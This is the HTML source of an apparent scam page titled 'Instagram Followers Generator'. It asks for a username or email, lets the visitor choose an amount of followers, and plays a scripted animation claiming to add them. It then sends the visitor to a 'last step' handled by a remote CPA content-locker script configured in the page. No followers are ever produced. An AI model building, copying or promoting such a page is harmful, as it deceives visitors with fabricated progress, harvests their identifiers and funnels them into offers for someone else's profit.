...
<!DOCTYPE html>
<!--
T: 2022-05-01 20:26:29
Api: e610a45fe2fd27278cc5
It: 2545464

-->
<html><head>
    <title>Instagram Followers Generator</title>
<meta name="description" content="Instagram Followers Generator"/>
<meta property="og:title" content="Instagram Followers Generator"/>
<meta property="og:description" content="Instagram Followers Generator"/>
...
body{
  background-image: url('https://d13pxqgp3ixdbh.cloudfront.net/uploads/1637759112e1881684740ba1bd68ac46940088ad53.jpg') ;
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
...
:root{
  ...
  --backgroundUsername:linear-gradient(to left  ,#d91756,#ee5430,#f5b446);

  --platform:linear-gradient(to left  ,#d91756,#ee5430,#f5b446);
  --SelectedPlatform:linear-gradient(to left  ,#ff4280,#ff8569,#ffcb73);

  --UserFoundText:white;  
  --LogoFound:#d91756;

  --SelectedPlatformHoverShadow1:#d91756;
  --SelectedPlatformHoverShadow2:#d91756;
  --SelectedPlatformHoverShadow3:#ee5430;
  --SelectedPlatformHoverShadow4:white;
  --SelectedPlatformHoverShadow5:#f5b446;


  --buttons:linear-gradient(to left  ,#d91756,#ee5430,#f5b446);
  --buttonsHover:linear-gradient(to left  ,#ff4280,#ff8569,#ffcb73);
  --ProBar:#ffcb73;
  ...
  --keyframesShadow1:#d91756;
  --keyframesShadow2:#d91756;
  --keyframesShadow3:#ee5430;
  --keyframesShadow4:#f5b446;
  --keyframesShadow5:#f5b446;

  --keyframesShadow6:#d91756;
  --keyframesShadow7:#ee5430;
  --keyframesShadow8:#d91756;
  --keyframesShadow9:#ee5430;
  --keyframesShadow10:#f5b446;
...
box-shadow: 0 0 5px var(--boxshadow1),
        ...
        0 0 12px var(--boxshadow4),
        0 0 15px var(--boxshadow5);
        animation: neon 1s ease-in infinite;
}
@keyframes neon{
  25%{box-shadow: 0 0 5px var(--keyframesShadow1),
        0 0 5px var(--keyframesShadow2),
        0 0 10px var(--keyframesShadow3),
        0 0 12px var(--keyframesShadow4),
        0 0 15px var(--keyframesShadow5);}
  75%{box-shadow: 0 0 5px var(--keyframesShadow6),
        0 0 15px var(--keyframesShadow7),
        0 0 20px var(--keyframesShadow8),
        0 0 40px var(--keyframesShadow9),
        0 0 50px var(--keyframesShadow10);}    
}
.step{
  width: 60px;
  height: 60px;
...
margin-top: 60px;
  ...
  background-clip: padding-box;
  box-shadow: 0 0 5px var(--boxshadow1),
        0 0 15px var(--boxshadow2),
        0 0 20px var(--boxshadow3),
        0 0 40px var(--boxshadow4),
        0 0 70px var(--boxshadow5);
        animation: neon 1s ease-in infinite;
...
<img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1635084417577c52a4f572b38c329bb78062d1a4a4.png" class="logo">
<div class="instagram">FOLLOWERS GENERATOR</div>
  <div class="main" id="main">
 <div class="step">
    <div class="step-icon"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1616768451bbe132d4ca25c0c41ca7084062465d64.png" style="width: 60px;"></div>
      </div>
<div class="step1" id="step1" style="Display:1none">
    <div class="step1-text"><b>Please Enter your Username Or Email.</b></div>
    <br>
    <div class="inputbox">
      <img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1625809692a12c02ac8c4366a2fd94b22ac8951d0f.png" class="username-icon">
      <input class="u-i"  placeholder="Username/Email"  id="uid" >
    </div>
...
<div class="trademark">© Copyright, all rights reserved.
...
<div class="step1">
    <div class="step1-text"><b>Please select the amount of Followers</b></div>
    <br>

<div class="SelectedAmount-box">
  <div class="SelectedAmount-box-text"><span style="background-color: #ee5430;
    font-size: 12px;
    color: white;
    padding: 5px;
    border-radius: 40px;
    ...
    <img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1625029488971f38a72a02709697045cd60a5e1f69.png" style="width:90px;margin-top:25px;">
        <div class="AmountSelected-text" id="test">
          <span class="gemstext" id="selected-gems-text" style="font-size: 24px;
            font-weight: 900;">1 000</span>
          <span style="font-size: 16px;">Followers</span>
        </div>

        <div class="gems-Amount-Selected" id="gemsAmountSelected1" onclick="gemsAmountSelected(&#39;gemsAmountSelected1&#39;,&#39;1000 &#39;)"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/16250294865927545b53c519973dae63ab5c9c7b62.png" style="width:70px;margin-bottom: -7px;"> <span style="font-size: 16px;font-weight: bold;">1 000</span><span style="font-size: 14px;"> Followers</span> </div>
        <div class="gems-Amount" id="gemsAmountSelected2" onclick="gemsAmountSelected(&#39;gemsAmountSelected2&#39;,&#39;2500 &#39;)"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/16250294865927545b53c519973dae63ab5c9c7b62.png" style="width:70px;margin-bottom: -7px;"> <span style="font-size: 16px;font-weight: bold;">2 500</span><span style="font-size: 14px;"> Followers</span> </div>
        <div class="gems-Amount" id="gemsAmountSelected3" onclick="gemsAmountSelected(&#39;gemsAmountSelected3&#39;,&#39;5000 &#39;)"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1625029487d11043412c66384d96b2e05c22a2996f.png" style="width:70px;margin-bottom: -7px;"> <span style="font-size: 16px;font-weight: bold;">5 000</span><span style="font-size: 14px;"> Followers</span> </div>
        <div class="gems-Amount" id="gemsAmountSelected4" onclick="gemsAmountSelected(&#39;gemsAmountSelected4&#39;,&#39;9999 &#39;)"><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1625029488971f38a72a02709697045cd60a5e1f69.png" style="width:70px;margin-bottom: -7px;"> <span style="font-size: 16px;font-weight: bold;">9 999</span><span style="font-size: 14px;"> Followers</span> </div>
...
<img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1635653021ac61a7aa31f58b94c30339f142fa4242.png" class="setting-icon" style="width:150px;filter: invert(30%);">
...
<img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/163542468278c021e06cc778d4aef36f80e47413a2.gif" id="settingicon" class="setting-icon" style="width:20px;position:absolute; right:3px;top:3px">
    ...
    <img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1625029488971f38a72a02709697045cd60a5e1f69.png" id="gemsicon" style="  width:100px;margin-bottom: 5px;
      margin-top:10px;">
...
<div class="main5" id="main5" style="display:none">
  ...
  <div class="step">
    ...
    <div class="step1-text" ><b>Last Step</b></div>
    ...
    color: #f5b446 ;
    font-weight: 700;"></span> Will be added to your account ! Please complete the last step by click the button below.
</div>
...
<script type="text/javascript">
    var CPABUILDSETTINGS={"it":2543759,"key":"cdb8c"};
    var forward="";
...
<script src="https://d12u7tum9sda5e.cloudfront.net/4c21716.js"></script>
<script type="text/javascript">
    ...
    document.getElementById("main2").style.display="none";
        ...
        function UserTimer() {
          if (linestep==1){
            ...
            document.getElementById("loading-step").innerHTML='Adding <span style="font-size: 24px;font-weight: 900;">'+gemsvalue+'</span>Followers for <span style="font-size: 24px;font-weight: 900;">' + name +'</span>' ;
        ...
        var myVar2 = setInterval(UserTimerAddgems, 1);
        var gemstext=1;
        function UserTimerAddgems() {
          ...
          audiosDiamondscess.play();
              ...
              document.getElementById("settingicon").src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1636472786ee1905a53e0b903bb72600a288d20d03.png";
              document.getElementById("gemsicon").src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1625029488971f38a72a02709697045cd60a5e1f69.png";
...
document.getElementById("lastStep-gems").innerHTML=gemsvalue + " Followers";
    document.getElementById("lastStep-name").innerHTML=name;
document.getElementById("lastStep-gems2").innerHTML=gemsvalue;
    document.getElementById("lastStep-name2").innerHTML="Followers";
